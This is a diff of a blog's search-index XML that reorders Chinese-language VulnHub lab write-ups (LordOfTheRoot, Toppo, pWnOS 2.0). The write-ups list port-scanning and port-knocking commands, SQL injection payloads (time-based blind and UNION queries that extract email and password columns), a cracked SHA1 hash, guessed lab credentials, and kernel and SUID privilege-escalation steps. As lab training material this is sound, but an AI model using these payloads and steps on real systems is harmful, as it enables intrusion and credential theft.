-    <content><![CDATA[<h1 id="LordOfTheRoot-1-0-1"><a href="#LordOfTheRoot-1-0-1" class="headerlink" title="LordOfTheRoot_1.0.1"></a>LordOfTheRoot_1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/LordOfTheRoot_1.0.1/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh连接</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/2.png" alt="2"></p>
-<p>提示了knockd</p>
-<p>尝试敲门</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 1 2 3; do nmap -Pn -p $x 192.168.1.205; done</span><br></pre></td></tr></table></figure>
-
-<p>这种方法这里竟然不行，不知道为什么</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -p 1,2,3 192.168.1.205</span><br></pre></td></tr></table></figure>
-
-<p>不搞骚操作是可以的</p>
-<p>重新扫描发现1337端口，web服务</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/3.png" alt="3"></p>
-<p>目录扫描发现了<code>/mordor/</code></p>
-<p><img src="/images/LordOfTheRoot_1.0.1/4.png" alt="4"></p>
-<p>接着有一段base64</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/5.png" alt="5"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LordOfTheRoot_1.0.1/6.png" alt="6"></p>
-<p>尝试sql注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>
-
-<p>成功登录，不过啥也没有，看来这里是要用盲注来获取一些数据了<br>尝试延时注入，成功payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(5)#</span><br></pre></td></tr></table></figure>
-
-<p>盲注特别痛苦，就不手工了，给一个实例的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,5,0))#</span><br></pre></td></tr></table></figure>
-
-<p>别忘了提交password参数就行</p>
-<p>最后可以爆破出一个表</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/7.png" alt="7"></p>
-<p>用它们尝试ssh登录</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/LordOfTheRoot_1.0.1/8.png" alt="8"></p>
-<p>内核提权</p>
-<p>尝试寻找</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit linux kernel 3.19</span><br></pre></td></tr></table></figure>
-
-<p>没有可以用的，反而还把机器给打崩了</p>
-<p>换个角度</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/9.png" alt="9"></p>
-<p>发现</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/10.png" alt="10"></p>
-<p>39166.c</p>
-<p><img src="/images/LordOfTheRoot_1.0.1/11.png" alt="11"></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -9458,6 +9401,63 @@
 <p><img src="/images/Lin.Security/29.png" alt="29"></p>
 <h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>这里提权都是比较常见的问题，linpeas可以枚举出很多</p>
 <p>另外注意，如果能切换用户，应该仔细检查不同的用户信息</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场LordOfTheRoot_1.0.1</title>
+    <url>/2020/09/17/%E9%9D%B6%E5%9C%BALordOfTheRoot-1-0-1/</url>
+    <content><![CDATA[<h1 id="LordOfTheRoot-1-0-1"><a href="#LordOfTheRoot-1-0-1" class="headerlink" title="LordOfTheRoot_1.0.1"></a>LordOfTheRoot_1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/LordOfTheRoot_1.0.1/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh连接</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/2.png" alt="2"></p>
+<p>提示了knockd</p>
+<p>尝试敲门</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 1 2 3; do nmap -Pn -p $x 192.168.1.205; done</span><br></pre></td></tr></table></figure>
+
+<p>这种方法这里竟然不行，不知道为什么</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -p 1,2,3 192.168.1.205</span><br></pre></td></tr></table></figure>
+
+<p>不搞骚操作是可以的</p>
+<p>重新扫描发现1337端口，web服务</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/3.png" alt="3"></p>
+<p>目录扫描发现了<code>/mordor/</code></p>
+<p><img src="/images/LordOfTheRoot_1.0.1/4.png" alt="4"></p>
+<p>接着有一段base64</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/5.png" alt="5"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/LordOfTheRoot_1.0.1/6.png" alt="6"></p>
+<p>尝试sql注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+
+<p>成功登录，不过啥也没有，看来这里是要用盲注来获取一些数据了<br>尝试延时注入，成功payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(5)#</span><br></pre></td></tr></table></figure>
+
+<p>盲注特别痛苦，就不手工了，给一个实例的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,5,0))#</span><br></pre></td></tr></table></figure>
+
+<p>别忘了提交password参数就行</p>
+<p>最后可以爆破出一个表</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/7.png" alt="7"></p>
+<p>用它们尝试ssh登录</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/LordOfTheRoot_1.0.1/8.png" alt="8"></p>
+<p>内核提权</p>
+<p>尝试寻找</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit linux kernel 3.19</span><br></pre></td></tr></table></figure>
+
+<p>没有可以用的，反而还把机器给打崩了</p>
+<p>换个角度</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/9.png" alt="9"></p>
+<p>发现</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/10.png" alt="10"></p>
+<p>39166.c</p>
+<p><img src="/images/LordOfTheRoot_1.0.1/11.png" alt="11"></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -10618,27 +10618,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶场Toppo 1</title>
-    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAToppo-1/</url>
-    <content><![CDATA[<h1 id="Toppo-1"><a href="#Toppo-1" class="headerlink" title="Toppo 1"></a>Toppo 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Toppo-1/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Toppo-1/2.png" alt="2"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现了隐藏文件</p>
-<p><img src="/images/Toppo-1/3.png" alt="3"></p>
-<p>可以猜测，登录凭据为ted/12345ted123</p>
-<p><img src="/images/Toppo-1/4.png" alt="4"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Toppo-1/6.png" alt="6"></p>
-<p>SUID提权</p>
-<p><img src="/images/Toppo-1/5.png" alt="5"></p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶场Tr0ll 1</title>
     <url>/2020/09/17/%E9%9D%B6%E5%9C%BATr0ll-1/</url>
     <content><![CDATA[<h1 id="Tr0ll-1"><a href="#Tr0ll-1" class="headerlink" title="Tr0ll 1"></a>Tr0ll 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
@@ -10679,6 +10658,27 @@
 
 <p>37292.c</p>
 <p><img src="/images/Tr0ll-1/12.png" alt="12"></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场Toppo 1</title>
+    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAToppo-1/</url>
+    <content><![CDATA[<h1 id="Toppo-1"><a href="#Toppo-1" class="headerlink" title="Toppo 1"></a>Toppo 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Toppo-1/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Toppo-1/2.png" alt="2"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现了隐藏文件</p>
+<p><img src="/images/Toppo-1/3.png" alt="3"></p>
+<p>可以猜测，登录凭据为ted/12345ted123</p>
+<p><img src="/images/Toppo-1/4.png" alt="4"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Toppo-1/6.png" alt="6"></p>
+<p>SUID提权</p>
+<p><img src="/images/Toppo-1/5.png" alt="5"></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -11129,7 +11129,7 @@
 <p><strong>爆数据</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select email from users limit 0,1),5,6,7,8#</span><br><span class="line">1&#39; union select 1,2,3,(select pass from users limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>
 
-<p>得到<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#46;&#x63;&#x6f;&#109;">&#x61;&#100;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#46;&#x63;&#x6f;&#109;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
+<p>得到<a href="mailto:&#x61;&#x64;&#109;&#x69;&#110;&#64;&#105;&#115;&#x69;&#x6e;&#116;&#115;&#46;&#99;&#111;&#109;">&#x61;&#x64;&#109;&#x69;&#110;&#64;&#105;&#115;&#x69;&#x6e;&#116;&#115;&#46;&#99;&#111;&#109;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
 <p>得到killerbeesareflying</p>
 <p>但是这个凭据仍然无法登录</p>
 <p><img src="/images/pWnOS2.0/7.png" alt="7"></p>
